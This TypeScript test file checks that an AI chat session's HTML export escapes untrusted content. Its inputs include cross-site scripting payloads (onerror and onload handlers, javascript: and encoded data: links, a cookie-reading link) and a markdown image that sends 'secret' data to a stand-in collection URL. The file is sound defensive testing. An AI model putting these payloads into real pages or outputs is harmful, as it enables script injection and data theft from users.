import fs from "node:fs";
import path from "node:path";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { parseHTML } from "linkedom";

type SessionEntry = {
  id: string;
  parentId: string | null;
  timestamp: string;
  type: string;
  message?: unknown;
  summary?: string;
  content?: unknown;
  display?: boolean;
  customType?: string;
  provider?: string;
  modelId?: string;
  thinkingLevel?: string;
};

type SessionData = {
  header: { id: string; timestamp: string };
  entries: SessionEntry[];
  leafId: string;
  systemPrompt: string;
  tools: unknown[];
};

const exportHtmlDir = path.dirname(fileURLToPath(import.meta.url));
const templateHtml = fs.readFileSync(path.join(exportHtmlDir, "template.html"), "utf8");
const templateJs = fs.readFileSync(path.join(exportHtmlDir, "template.js"), "utf8");
const markedJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "marked.min.js"), "utf8");
const highlightJs = fs.readFileSync(path.join(exportHtmlDir, "vendor", "highlight.min.js"), "utf8");

function renderTemplate(sessionData: SessionData) {
  const html = templateHtml
    .replace("{{CSS}}", "")
    .replace("{{SESSION_DATA}}", Buffer.from(JSON.stringify(sessionData), "utf8").toString("base64"))
    .replace("{{MARKED_JS}}", "")
    .replace("{{HIGHLIGHT_JS}}", "")
    .replace("{{JS}}", "");

  const { document, window } = parseHTML(html);
  if (window.HTMLElement?.prototype) {
    window.HTMLElement.prototype.scrollIntoView = () => {};
  }

  const immediateTimeout = (fn: (...args: unknown[]) => void) => {
    fn();
    return 0;
  };
  const runtime: Record<string, unknown> = {
    document,
    console,
    clearTimeout: () => {},
    setTimeout: immediateTimeout,
    URLSearchParams,
    TextDecoder,
    atob: (s: string) => Buffer.from(s, "base64").toString("binary"),
    btoa: (s: string) => Buffer.from(s, "binary").toString("base64"),
    navigator: { clipboard: { writeText: async () => {} } },
    history: { replaceState: () => {} },
    location: { href: "http://localhost/export.html", search: "" },
  };
  runtime.window = runtime;
  runtime.self = runtime;
  runtime.globalThis = runtime;

  vm.createContext(runtime);
  vm.runInContext(markedJs, runtime);
  vm.runInContext(highlightJs, runtime);
  vm.runInContext(templateJs, runtime);
  return { document };
}

function now() {
  return new Date("2026-02-24T00:00:00.000Z").toISOString();
}

describe("export html security hardening", () => {
  it("escapes raw HTML from markdown blocks", () => {
    const attack = "<img src=x onerror=alert(1)>";
    const session: SessionData = {
      header: { id: "session-1", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: { role: "user", content: attack },
        },
        {
          id: "2",
          parentId: "1",
          timestamp: now(),
          type: "branch_summary",
          summary: attack,
        },
        {
          id: "3",
          parentId: "2",
          timestamp: now(),
          type: "custom_message",
          customType: "x",
          display: true,
          content: attack,
        },
      ],
      leafId: "3",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector("img[onerror]")).toBeNull();
    expect(messages?.innerHTML).toContain("&lt;img src=x onerror=alert(1)&gt;");
  });

  it("escapes tree and header metadata fields", () => {
    const attack = "<img src=x onerror=alert(9)>";
    const baseEntries: SessionEntry[] = [
      {
        id: "1",
        parentId: null,
        timestamp: now(),
        type: "message",
        message: { role: "user", content: "ok" },
      },
      {
        id: "2",
        parentId: "1",
        timestamp: now(),
        type: "message",
        message: {
          role: "assistant",
          model: attack,
          provider: "p",
          content: [{ type: "text", text: "assistant" }],
        },
      },
      {
        id: "3",
        parentId: "2",
        timestamp: now(),
        type: "message",
        message: { role: "toolResult", toolName: attack },
      },
      {
        id: "4",
        parentId: "3",
        timestamp: now(),
        type: "model_change",
        provider: "p",
        modelId: attack,
      },
      {
        id: "5",
        parentId: "4",
        timestamp: now(),
        type: "thinking_level_change",
        thinkingLevel: attack,
      },
      {
        id: "6",
        parentId: "5",
        timestamp: now(),
        type: attack,
      },
    ];

    const headerSession: SessionData = {
      header: { id: "session-2", timestamp: now() },
      entries: baseEntries,
      leafId: "6",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(headerSession);
    const tree = document.getElementById("tree-container");
    const header = document.getElementById("header-container");
    expect(tree).toBeTruthy();
    expect(header).toBeTruthy();
    expect(tree?.querySelector("img[onerror]")).toBeNull();
    expect(header?.querySelector("img[onerror]")).toBeNull();
    expect(tree?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");
    expect(header?.innerHTML).toContain("&lt;img src=x onerror=alert(9)&gt;");

    const modelLeafSession: SessionData = {
      header: { id: "session-2-model", timestamp: now() },
      entries: baseEntries,
      leafId: "4",
      systemPrompt: "",
      tools: [],
    };
    const modelLeaf = renderTemplate(modelLeafSession).document;
    expect(modelLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(modelLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );

    const thinkingLeafSession: SessionData = {
      header: { id: "session-2-thinking", timestamp: now() },
      entries: baseEntries,
      leafId: "5",
      systemPrompt: "",
      tools: [],
    };
    const thinkingLeaf = renderTemplate(thinkingLeafSession).document;
    expect(thinkingLeaf.getElementById("tree-container")?.querySelector("img[onerror]")).toBeNull();
    expect(thinkingLeaf.getElementById("tree-container")?.innerHTML).toContain(
      "&lt;img src=x onerror=alert(9)&gt;",
    );
  });

  it("sanitizes image MIME types used in data URLs", () => {
    const session: SessionData = {
      header: { id: "session-3", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "user",
            content: [
              {
                type: "image",
                data: "AAAA",
                mimeType: 'image/png" onerror="alert(7)',
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const img = document.querySelector("#messages .message-image");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("src")).toBe("data:application/octet-stream;base64,AAAA");
  });

  it("flattens remote markdown images but keeps data-image markdown", () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      header: { id: "session-4", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "assistant",
            content: [
              {
                type: "text",
                text: `Leak:\n\n![exfil](https://example.com/collect?data=secret)\n\n![pixel](${dataImage})`,
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const messages = document.getElementById("messages");
    expect(messages).toBeTruthy();
    expect(messages?.querySelector('img[src^="https://"]')).toBeNull();
    expect(messages?.textContent).toContain("exfil");
    expect(messages?.querySelector(`img[src="${dataImage}"]`)).toBeTruthy();
  });

  it("escapes markdown data-image attributes", () => {
    const dataImage = "data:image/png;base64,AAAA";
    const session: SessionData = {
      header: { id: "session-5", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: {
            role: "assistant",
            content: [
              {
                type: "text",
                text: `![x" onerror="alert(1)](${dataImage})`,
              },
            ],
          },
        },
      ],
      leafId: "1",
      systemPrompt: "",
      tools: [],
    };

    const { document } = renderTemplate(session);
    const img = document.querySelector("#messages img");
    expect(img).toBeTruthy();
    expect(img?.getAttribute("onerror")).toBeNull();
    expect(img?.getAttribute("alt")).toBe('x" onerror="alert(1)');
    expect(img?.getAttribute("src")).toBe(dataImage);
  });
});

// ============================================================
// Link protocol sanitization tests
// ============================================================

function makeSession(entries: SessionEntry[]): SessionData {
  return {
    header: { id: `test-${Date.now()}`, timestamp: now() },
    entries,
    leafId: entries[entries.length - 1].id,
    systemPrompt: "",
    tools: [],
  };
}

function userTextEntry(id: string, parentId: string | null, text: string): SessionEntry {
  return {
    id,
    parentId,
    timestamp: now(),
    type: "message",
    message: { role: "user", content: text },
  };
}

function assistantTextEntry(id: string, parentId: string | null, text: string): SessionEntry {
  return {
    id,
    parentId: parentId ?? null,
    timestamp: now(),
    type: "message",
    message: {
      role: "assistant",
      content: [{ type: "text", text }],
    },
  };
}

describe("link protocol sanitization", () => {
  const dangerousLinks = [
    { name: "javascript: protocol", md: "[click](javascript:alert(1))" },
    { name: "JAVASCRIPT: uppercase", md: "[click](JAVASCRIPT:alert(1))" },
    { name: "jAvAsCrIpT: mixed case", md: "[click](jAvAsCrIpT:alert(1))" },
    { name: "vbscript: protocol", md: "[click](vbscript:MsgBox(1))" },
    { name: "data:text/html", md: "[click](data:text/html,<script>alert(1)</script>)" },
    { name: "data:text/html;base64", md: "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)" },
    { name: "data:image/svg+xml (SVG XSS)", md: "[click](data:image/svg+xml,<svg onload=alert(1)>)" },
    { name: "data:application/xhtml+xml", md: "[click](data:application/xhtml+xml,<html>)" },
    { name: "percent-encoded javascript: (full)", md: "[click](%6A%61%76%61%73%63%72%69%70%74:alert(1))" },
    { name: "percent-encoded javascript: (partial)", md: "[click](java%73cript:alert(1))" },
    { name: "autolink javascript:", md: "<javascript:alert(1)>" },
    { name: "reference-style javascript:", md: "[click][1]\n\n[1]: javascript:alert(1)" },
  ];

  it.each(dangerousLinks)(
    "blocks $name in assistant markdown",
    ({ md }) => {
      const session = makeSession([
        assistantTextEntry("1", null, md),
      ]);
      const { document } = renderTemplate(session);
      const messages = document.getElementById("messages");
      const anchors = messages?.querySelectorAll("a") ?? [];
      for (const a of anchors) {
        const href = (a.getAttribute("href") || "").toLowerCase().replace(/[\s\t\n\r]/g, "");
        expect(href).not.toMatch(/^javascript:/);
        expect(href).not.toMatch(/^vbscript:/);
        expect(href).not.toMatch(/^data:/);
        expect(href).not.toMatch(/^%6a/i);
      }
    },
  );

  it("allows safe https: links", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "[OpenClaw](https://openclaw.example.com)"),
    ]);
    const { document } = renderTemplate(session);
    const link = document.querySelector("#messages a");
    expect(link).toBeTruthy();
    expect(link?.getAttribute("href")).toBe("https://openclaw.example.com");
  });

  it("allows safe http: links", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "[local](http://localhost:3000)"),
    ]);
    const { document } = renderTemplate(session);
    const link = document.querySelector("#messages a");
    expect(link?.getAttribute("href")).toBe("http://localhost:3000");
  });

  it("allows mailto: links", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "[email](mailto:user@example.com)"),
    ]);
    const { document } = renderTemplate(session);
    const link = document.querySelector("#messages a");
    expect(link?.getAttribute("href")).toBe("mailto:user@example.com");
  });

  it("allows fragment links", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "[section](#heading)"),
    ]);
    const { document } = renderTemplate(session);
    const link = document.querySelector("#messages a");
    expect(link?.getAttribute("href")).toBe("#heading");
  });
});

describe("link protocol sanitization — cross-surface", () => {
  it("blocks javascript: links in user markdown", () => {
    const session = makeSession([
      userTextEntry("1", null, "[trap](javascript:document.cookie)"),
    ]);
    const { document } = renderTemplate(session);
    const anchors = document.querySelectorAll("#messages a");
    for (const a of anchors) {
      const href = (a.getAttribute("href") || "").toLowerCase();
      expect(href).not.toMatch(/^javascript:/);
    }
  });

  it("blocks javascript: links in branch_summary", () => {
    const session: SessionData = {
      header: { id: "s-link-branch", timestamp: now() },
      entries: [
        {
          id: "1",
          parentId: null,
          timestamp: now(),
          type: "message",
          message: { role: "user", content: "ok" },
        },
        {
          id: "2",
          parentId: "1",
          timestamp: now(),
          type: "branch_summary",
          summary: "[exploit](javascript:alert(document.domain))",
        },
      ],
      leafId: "2",
      systemPrompt: "",
      tools: [],
    };
    const { document } = renderTemplate(session);
    const anchors = document.querySelectorAll("#messages a");
    for (const a of anchors) {
      expect((a.getAttribute("href") || "").toLowerCase()).not.toMatch(/^javascript:/);
    }
  });
});

describe("defense-in-depth innerHTML meta-tests", () => {
  it("no script tags survive in rendered messages", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "normal content with [link](https://example.com)"),
    ]);
    const { document } = renderTemplate(session);
    const scripts = document.querySelectorAll("#messages script");
    expect(scripts.length).toBe(0);
  });

  it("no event handler attributes survive in rendered messages", () => {
    const session = makeSession([
      assistantTextEntry("1", null, "normal content"),
    ]);
    const { document } = renderTemplate(session);
    const all = document.querySelectorAll("#messages *");
    for (const el of all) {
      const attrs = el.getAttributeNames?.() ?? [];
      for (const attr of attrs) {
        expect(attr.toLowerCase()).not.toMatch(/^on[a-z]/);
      }
    }
  });
});
